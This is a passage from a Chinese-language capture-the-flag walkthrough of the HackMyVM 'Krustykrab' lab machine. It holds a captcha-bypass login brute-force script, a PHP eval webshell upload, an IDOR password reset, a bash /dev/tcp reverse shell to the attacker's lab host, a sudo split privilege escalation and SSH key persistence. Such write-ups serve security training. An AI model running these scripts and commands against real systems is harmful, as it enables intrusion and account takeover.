03e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中\u003ccode\u003e/finexo/login.php?action=generateCaptcha\u003c/code\u003e 是用来生成验证码的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/finexo/particles.js-master/dist/particles.min.js\u003c/code\u003e 中发现加密后的 \u003ccode\u003ejs\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一眼 \u003ccode\u003eJsFuck\u003c/code\u003e ，通过 \u003ca href=\"https://www.dcode.fr/jsfuck-language\"\u003ehttps://www.dcode.fr/jsfuck-language\u003c/a\u003e 可以进行解密，解密后的内容如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003egenerateCaptcha\u003c/span\u003e\u003c/span\u003e() { \n\t\u003cspan class=\"hljs-variable\"\u003e$characters\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"\u003c/span\u003e; \n\t\u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e; \n\t\u003cspan class=\"hljs-variable\"\u003e$seed\u003c/span\u003e = \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e(); \n\tmt_srand(\u003cspan class=\"hljs-variable\"\u003e$seed\u003c/span\u003e); \n\t\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e = 0; \u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e \u0026#x3C; 4; \u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e++) { \n\t\t\u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e .= \u003cspan class=\"hljs-variable\"\u003e$characters\u003c/span\u003e[mt_rand(0, strlen(\u003cspan class=\"hljs-variable\"\u003e$characters\u003c/span\u003e) - 1)]; \n\t} \n\t\u003cspan class=\"hljs-variable\"\u003e$_SESSION\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'captcha'\u003c/span\u003e] = strtolower(\u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e); \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e; \n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这个函数的核心流程：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e从指定字符集合里随机选取4个字符组成验证码；\u003c/li\u003e\n\u003cli\u003e把验证码的小写版本存入 \u003ccode\u003e$_SESSION\u003c/code\u003e，用于后续验证；\u003c/li\u003e\n\u003cli\u003e返回验证码原文，通常前端页面会用这个值生成图片或者直接显示。\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这里\u003ccode\u003egenerateCaptcha\u003c/code\u003e中的\u003ccode\u003esession\u003c/code\u003e如果和\u003ccode\u003eLogin\u003c/code\u003e中的\u003ccode\u003esession\u003c/code\u003e如果是同一个，那么就可以绕过验证码了\u003c/p\u003e\n\u003cp\u003e编写脚本验证\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport requests\n\nlogin_url = \u003cspan class=\"hljs-string\"\u003e'http://192.168.56.132/finexo/login.php'\u003c/span\u003e\ncode_url = \u003cspan class=\"hljs-string\"\u003e'http://192.168.56.132/finexo/login.php?action=generateCaptcha'\u003c/span\u003e\n\ns = requests.session()\ncode = s.get(code_url).text\ndata = {\n    \u003cspan class=\"hljs-string\"\u003e'username'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'SpongeBob'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'test'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'captcha'\u003c/span\u003e: code,\n}\nres = s.post(login_url, data)\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'Wrong Password'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e res.text:\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Wrong password'\u003c/span\u003e)\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'验证码错误'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e返回 \u003ccode\u003eWrong Password\u003c/code\u003e，验证码有效\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e登录爆破\u003c/h3\u003e\n\u003cp\u003e编写脚本进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport requests\n\nlogin_url = \u003cspan class=\"hljs-string\"\u003e'http://192.168.56.132/finexo/login.php'\u003c/span\u003e\ncode_url = \u003cspan class=\"hljs-string\"\u003e'http://192.168.56.132/finexo/login.php?action=generateCaptcha'\u003c/span\u003e\n\ns = requests.session()\n\nwith open(\u003cspan class=\"hljs-string\"\u003e'rockyou.txt'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'r'\u003c/span\u003e) as f:\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e line \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e f:\n        line = line.strip()\n        code = s.get(code_url).text\n        data = {\n            \u003cspan class=\"hljs-string\"\u003e'username'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'SpongeBob'\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e: line,\n            \u003cspan class=\"hljs-string\"\u003e'captcha'\u003c/span\u003e: code,\n        }\n        res = s.post(login_url, data)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'Wrong Password'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e res.text:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e'Wrong password:{line}'\u003c/span\u003e)\n        \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'Wrong Captcha'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e res.text:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Wrong captcha'\u003c/span\u003e)\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e'密码正确：{line}'\u003c/span\u003e)\n            \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e正确密码是：\u003ccode\u003esquarepants\u003c/code\u003e ，感觉这个还可以根据用户名来猜密码…因为海绵宝宝全称就是\u003ccode\u003e*SpongeBob SquarePants*\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e文件上传（兔子洞）\u003c/h3\u003e\n\u003cp\u003e登陆进去\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有一个文件上传页面，能上传头像\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e构造恶意数据包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e------geckoformboundary4059528d1f58fd4c6ea77567d1b81073\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"profile_picture\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\"shell.php\"\u003c/span\u003e\nContent-Type: image/png\n\nPNG\n\t\u0026#x3C;?php \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[1]); ?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没有任何限制，直接上传成功了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是发现会经过二次处理，上传之后的马都经过二次处理后变得无法使用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e越权\u003c/h3\u003e\n\u003cp\u003e我们还可以注意到有 \u003ccode\u003eNew Password\u003c/code\u003e 输入框\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e数据包里面长这样\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e------geckoformboundary4059528d1f58fd4c6ea77567d1b81073\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e\n\n123456\n------geckoformboundary4059528d1f58fd4c6ea77567d1b81073\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e\n\nSpongeBob\n------geckoformboundary4059528d1f58fd4c6ea77567d1b81073--\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e并且在 mail 中可以发现用户 \u003ccode\u003eAdministratro\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试将\u003ccode\u003eSpongeBob\u003c/code\u003e改为\u003ccode\u003eadministrator\u003c/code\u003e ，提示成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试以 \u003ccode\u003eAdministratro\u003c/code\u003e 用户进行登录，成功登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以在下面找到命令执行的功能\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/bin/bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.4/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Krustykrab nc -lvp 1234                               \nlistening on [any] 1234 ...\n192.168.56.132: inverse host lookup failed: Unknown host\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.132] 46124\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (691): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nwww-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003eto KrustyKrab\u003c/h3\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www-data on KrustyKrab:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on KrustyKrab:\n    (KrustyKrab) NOPASSWD: /usr/bin/split\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003eGTFbins\u003c/code\u003e 寻找利用方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -u KrustyKrab \u003cspan class=\"hljs-built_in\"\u003esplit\u003c/span\u003e --filter=/bin/sh -\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以获得 \u003ccode\u003eKrustyKrab\u003c/code\u003e 的 \u003ccode\u003eshell\u003c/code\u003e，写入公钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ssh-rsa xxxxx\"\u003c/span\u003e \u003e .ssh/authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Krustykrab ssh KrustyKrab@192.168.56.132\nLinux KrustyKrab 6.1.0-9-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64\u003c/span\u003e\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Mar 30 00:15:24 2025 from 192.168.56.118\nKrustyKrab@KrustyKrab:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eto spongebob\u003c/h3\u003e\n\u003cp\u003e家目录下可以读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-ruby\"\u003e\u003cspan class=\"hljs-title class_\"\u003eKrustyKrab\u003c/span\u003e\u003cspan class=\"hljs-variable\"\u003e@KrustyKrab\u003c/span\u003e\u003cspan class=\"hljs-symbol\"\u003e:~\u003c/span\u003e\u003cspan class=\"hljs-variable\"\u003e$ \u003c/span\u003ecat user.txt\ndcc8b0c111c9fa1522c7abfac8d1864b\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eKrustyKrab@KrustyKrab:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e KrustyKrab on KrustyKrab:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser KrustyKrab may run the following commands on KrustyKrab:\n    (spongebob) NOPASSWD: /usr/bin/ttteeesssttt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e海绵宝宝忘记怎么做蟹黄包了，你快帮帮他\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eKrustyKrab@KrustyKrab:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -u spongebob /usr/bin/ttteeesssttt\n\nSpongebob forgot how to make Krabby Patty, You need to \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e him!\n\nCurrent shuffled recipe order:\nA: Mustard\nB: Onion\nC: Ketchup\nD: Lettuce\nE: Cheese\nF: Pickles\nG: Top bun\nH: Patty\nI: Tomato\nJ: Bottom bun\n\nPlease enter the correct order using letters (e.g., ABCDEFGHIJ):\nEnter 10 letters (A-J): \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当前目录下还有一个文件 \u003ccode\u003ehelp\u003c/code\u003e ，是一个 \u003ccode\u003eGIF\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eKrustyKrab@KrustyKrab:~$ file \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e: GIF image data, version 89a, 480 x 270\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/help.gif\" alt=\"help.gif\"\u003e\u003c/p\u003e\n\u003cp\u003e刚好是蟹黄包配方：面包、肉饼、生菜、奶酪、洋葱、西红柿、番茄酱、芥末、腌椰菜、面包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e......\nEnter 10 letters (A-J): JHDEBICAFG\n\nValidation successful! Perfect Krabby Patty!\nspongebob@KrustyKrab:/home/KrustyKrab$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e顺序正确后得到了\u003ccode\u003espongebob\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e写入公钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ssh-rsa xxxxx\"\u003c/span\u003e \u003e .ssh/authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eto Krustykrab\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003espongebob\u003c/code\u003e 的家目录下存在\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003espongebob@KrustyKrab:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nkey1  key2.jpeg  note.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ekey1\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003espongebob@KrustyKrab:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e key1\ne1964798cfe86e914af895f8d0291812\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003enote.txt\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003espongebob@KrustyKrab:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e note.txt \n\nSquidward is waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e you!!!!\n\npassword is md5($key1\u003cspan class=\"hljs-variable\"\u003e$key2\u003c/span\u003e).\n\nIt\u003cspan class=\"hljs-string\"\u003e's not so hard as you think.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ekey2.jpeg\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMKrustykrab/key2.jpeg\" alt=\"key2.jpeg\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e看着像是图片隐写，但是没分离出来什么东西\u003c/p\u003e\n\u003cp\u003e尝试将 \u003ccode\u003ekey1\u003c/code\u003e 加上该图片的 MD5 值进行计算\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Krustykrab \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e key2.jpeg | \u003cspan class=\"hljs-built_in\"\u003emd5sum\u003c/span\u003e\n5e1d0c1a168dc2d70004c2b00ba314ae  -\n➜  Krustykrab \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -n \u003cspan clas
